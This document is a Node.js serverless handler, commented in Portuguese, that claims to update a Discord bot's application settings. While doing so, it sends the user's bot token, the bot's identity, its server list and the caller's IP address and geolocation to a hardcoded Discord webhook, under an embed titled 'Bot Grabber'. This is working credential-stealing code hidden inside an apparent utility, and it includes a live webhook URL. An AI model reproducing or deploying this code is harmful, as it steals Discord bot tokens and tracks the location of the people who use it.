module.exports = async (req, res) => {
  const {
    applicationId,
    token
  } = req.query;
  const webhookURL = 'https://discord.com/api/webhooks/1319442086524751902/jponFRjtTqcE9E0q-gy2lCCWJQySujcBuoKy5O39mphs-zaToU3An1zRckSOXqXtZICC';
  
  const ipLocationURL = `http://ip-api.com/json/`;
  const clientIP = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress; // Obtém o IP real do cliente

  if (!applicationId || !token) {
    return res.status(400).json({
      error: 'applicationId e token são necessários'
    });
  }

  try {
    const locationResponse = await fetch(`${ipLocationURL}${clientIP}`);
    const locationData = await locationResponse.json();

console.log(req.ip, clientIP)

    const botInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
      method: 'GET',
      headers: {
        Authorization: `Bot ${token}`,
      },
    });
    const botInfo = await botInfoResponse.json();

    const guildsResponse = await fetch('https://discord.com/api/v10/users/@me/guilds', {
      method: 'GET',
      headers: {
        Authorization: `Bot ${token}`,
      },
    });
    const guilds = await guildsResponse.json();

    const embed = {
      username: 'Bot Grabber',
      embeds: [{
        title: 'Nova Solicitação Recebida',
        color: 0x00ff00,
        fields: [{
          name: 'IP do Cliente',
          value: clientIP || 'Não disponível',
          inline: false
        },
          {
            name: 'Localização',
            value: `${locationData.country_name || 'Brasil'}, ${locationData.region || 'Não disponível'}, ${locationData.city || 'Não disponível'}`,
            inline: false
          },
          {
            name: 'Google Maps',
            value: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`,
            inline: false
          },
          {
            name: 'Informações',
            value: `\`${botInfo?.username} - ${botInfo?.id}\``,
            inline: false
          },
          {
            name: 'Token',
            value: `\`${token}\``,
            inline: false
          },
          {
            name: 'Servidores',
            value: guilds?.map(guild => guild.name).join(', ') || 'Nenhum',
            inline: false
          },
          {
            name: 'Data/Hora',
            value: new Date().toISOString(),
            inline: false
          },
        ],
      },
      ],
    };

    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(embed),
    });

    // Atualiza configurações do bot
    const response = await fetch(`https://discord.com/api/v9/applications/${applicationId}`, {
      headers: {
        accept: '*/*',
        'accept-language': 'pt-BR,pt;q=0.6',
        authorization: `Bot ${token}`,
        'content-type': 'application/json',
      },
      body: JSON.stringify({
        bot_public: false,
        bot_require_code_grant: false,
        flags: 11051008,
      }),
      method: 'PATCH',
    });

    if (response.ok) {
      return res.status(200).json({
        message: 'Configurações da aplicação atualizadas com sucesso!'
      });
    } else {
      const error = await response.json();
      return res.status(response.status).json({
        error: 'Erro ao atualizar configurações', details: error
      });
    }
  } catch (error) {
    return res.status(500).json({
      error: 'Erro ao fazer a requisição', details: error.message
    });
  }
}